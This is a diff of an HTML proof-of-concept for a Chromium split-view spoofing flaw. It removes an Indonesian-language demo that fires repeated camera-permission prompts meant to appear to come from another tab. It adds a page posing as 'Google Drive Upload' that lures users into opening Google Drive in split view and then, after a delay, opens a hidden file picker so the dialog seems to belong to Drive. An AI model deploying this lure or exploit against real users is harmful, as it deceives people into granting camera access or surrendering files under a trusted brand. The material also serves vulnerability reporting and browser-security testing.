@@ -1,175 +1,68 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>POC: Permission Prompt Spoofing (Gabungan)</title>
-    <style>
-        body {
-            font-family: system-ui, sans-serif;
-            padding: 20px;
-            background: #f0f0f0;
-        }
-        .container {
-            display: flex;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-        .panel {
-            background: white;
-            border: 2px solid #ccc;
-            border-radius: 12px;
-            padding: 20px;
-            flex: 1;
-            min-width: 300px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-        }
-        .panel h2 {
-            margin-top: 0;
-        }
-        iframe {
-            width: 100%;
-            height: 300px;
-            border: 1px solid #aaa;
-            border-radius: 8px;
-            background: #fff;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            margin-top: 10px;
-            cursor: pointer;
-        }
-        .warning {
-            background: #ffdddd;
-            border-left: 4px solid red;
-            padding: 10px;
-            margin-bottom: 20px;
-        }
-    </style>
+<title>Google Drive Upload</title>
+<style>
+    h1 {
+        margin: 1em;
+    }
+
+    a {
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 80;
+    }
+
+    input {
+        display: none;
+    }
+
+    img {
+        width: 100%;
+    }
+</style>
 </head>
 <body>
+<center>
+<br>
+<br>
+<br>
+<br>
 
-<div class="warning">
-    <strong>⚠️ Catatan:</strong> POC asli (Chromium Issue #1) memerlukan dua tab terpisah dengan mode <strong>Split View</strong> dan protokol <code>file://</code>.<br>
-    Karena Anda minta digabung menjadi <strong>satu file HTML</strong>, kode di bawah ini mensimulasikan <strong>UI spoofing</strong> dengan iframe + popup window.<br>
-    Untuk hasil maksimal, <strong>buka file ini di Chrome Canary</strong> dengan flag <code>#side-by-side</code> diaktifkan, lalu ikuti instruksi manual.
-</div>
+<a id="link" href="https://workspace.google.com/intl/en_in/products/drive/" > Right Click and Open in Split To Open Google Drive & Upload Fast</a>
+<br>
+<img id="img">
 
-<div class="container">
-    <!-- Panel Kiri: spoofpermisx.html (pemicu) -->
-    <div class="panel">
-        <h2>📁 Tab 1 (Attacker) – spoofpermisx.html</h2>
-        <p>Klik kanan pada tautan di bawah, lalu pilih <strong>"Open link in split view"</strong> (jika mode split view aktif).</p>
-        <div>
-            <a href="#" id="maliciousLink" oncontextmenu="triggerPermission(); return false;">🔗 Open link in split view (klik kanan)</a>
-        </div>
-        <p><small>* Jika split view tidak aktif, tautan akan terbuka di tab baru biasa – tetap bisa diuji tapi efek spoofing kurang kuat.</small></p>
-        <button id="manualPermBtn">▶️ Paksa minta izin kamera (dari tab 1)</button>
-        <div style="margin-top: 20px;">
-            <p><strong>Kode asli (dari laporan):</strong></p>
-            <pre style="background:#eee; padding:8px; font-size:12px;">
-&lt;script&gt;
-function triggerPermission() {
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then(() => console.log("izin diberikan"))
-        .catch(e => console.log("ditolak"));
-}
-&lt;/script&gt;
-            </pre>
-        </div>
-    </div>
+</center>
 
-    <!-- Panel Kanan: perm.html (korban) -->
-    <div class="panel">
-        <h2>📄 Tab 2 (Korban) – perm.html</h2>
-        <p>Prompt izin dari Tab 1 akan muncul di atas area ini <strong>seolah-olah berasal dari Tab 2</strong>.</p>
-        <div>
-            <iframe id="victimFrame" srcdoc="
-                <html>
-                <body style='font-family:sans-serif;text-align:center;padding:20px'>
-                    <h3>Halaman Korban (simulasi)</h3>
-                    <p>Seharusnya di sini tampil prompt izin palsu dari tab lain.</p>
-                    <button onclick='alert(\"Ini asli dari iframe\")'>Klik test</button>
-                </body>
-                </html>
-            "></iframe>
-        </div>
-        <p><small>* Dalam POC asli, <code>perm.html</code> hanya berisi teks "Click Allow" dan tidak perlu meminta izin sendiri.</small></p>
-    </div>
-</div>
+<input id="fileSelect" type="file" accept="image/*" />
+
+
 
 <script>
-    // Fungsi untuk memicu permission prompt (seperti di spoofpermisx.html)
-    function triggerPermission() {
-        console.log("[Tab 1] Meminta izin kamera...");
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                console.log("✅ Izin diberikan, stream aktif");
-                // Hentikan stream agar kamera tidak terus menyala
-                stream.getTracks().forEach(track => track.stop());
-                alert("Izin kamera DIBERIKAN. Prompt palsu sudah muncul di atas tab korban.");
-            })
-            .catch(err => {
-                console.log("❌ Izin ditolak atau error:", err);
-                alert("Izin ditolak. Coba klik tombol lagi.");
-            });
+  document.getElementById('link').addEventListener('contextmenu', function(event) {
+    // Prevent the default browser context menu from appearing
+
+setTimeout(function() {
+
+         fileSelect.click();
+
+
+fileSelect.onchange = (event) => {
+        img.src = URL.createObjectURL(fileSelect.files[0]);
     }
 
-    // Tombol manual untuk memicu permission
-    document.getElementById('manualPermBtn').addEventListener('click', triggerPermission);
+}, 4000);
 
-    // Untuk mensimulasikan efek "open link in split view", kita buat link yang
-    // jika diklik kanan akan membuka jendela baru (popup) yang berisi iframe korban.
-    // Tapi karena split view tidak bisa di-trigger via JS, kita beri instruksi manual.
-    const link = document.getElementById('maliciousLink');
-    link.addEventListener('click', (e) => {
-        e.preventDefault();
-        alert("🔁 Silakan KLIK KANAN pada tautan, lalu pilih 'Open link in split view' (jika support).\n" +
-              "Jika tidak, buka sendiri file ini di dua tab berbeda untuk testing.");
-    });
 
-    // Otomatis coba memicu permission setiap 5 detik untuk menunjukkan efek spoofing
-    // (hanya untuk demo, dalam exploit asli dipicu setelah split view)
-    let intervalId = null;
-    let spoofActive = false;
 
-    // Fungsi untuk memulai serangan simulasi (setelah user mengklik sesuatu)
-    function startSpoofSimulation() {
-        if (spoofActive) return;
-        spoofActive = true;
-        let count = 0;
-        intervalId = setInterval(() => {
-            count++;
-            console.log(`[Simulasi] Percobaan ke-${count} meminta izin dari Tab 1`);
-            triggerPermission();
-            if (count >= 3) {
-                clearInterval(intervalId);
-                spoofActive = false;
-                console.log("Simulasi berhenti setelah 3 kali.");
-            }
-        }, 5000);
-        alert("✅ Simulasi spoofing dimulai! Setiap 5 detik akan muncul prompt izin dari 'Tab 1'\n" +
-              "Abaikan prompt tersebut dan perhatikan bahwa prompt muncul seolah-olah dari Tab 2 (iframe).");
-    }
-
-    // Tambahkan tombol start simulasi
-    const startBtn = document.createElement('button');
-    startBtn.textContent = "🎭 Mulai Simulasi Spoofing (auto trigger setiap 5 detik)";
-    startBtn.style.marginTop = "20px";
-    startBtn.style.backgroundColor = "#ff8800";
-    startBtn.style.color = "white";
-    startBtn.style.border = "none";
-    startBtn.style.padding = "10px";
-    startBtn.style.borderRadius = "8px";
-    startBtn.style.cursor = "pointer";
-    document.querySelector('.panel:first-child').appendChild(startBtn);
-    startBtn.addEventListener('click', startSpoofSimulation);
-
-    // Perbaikan: jika prompt asli dari getUserMedia akan muncul sebagai dialog Chrome
-    // Itu sudah menunjukkan spoofing karena posisi dialog mengambang di atas halaman.
-    console.log("POC siap. Untuk pengujian asli, gunakan Chrome Canary + split view + dua file terpisah.");
+   
+  });
 </script>
 
 </body>
 </html>
+
+
+</style>
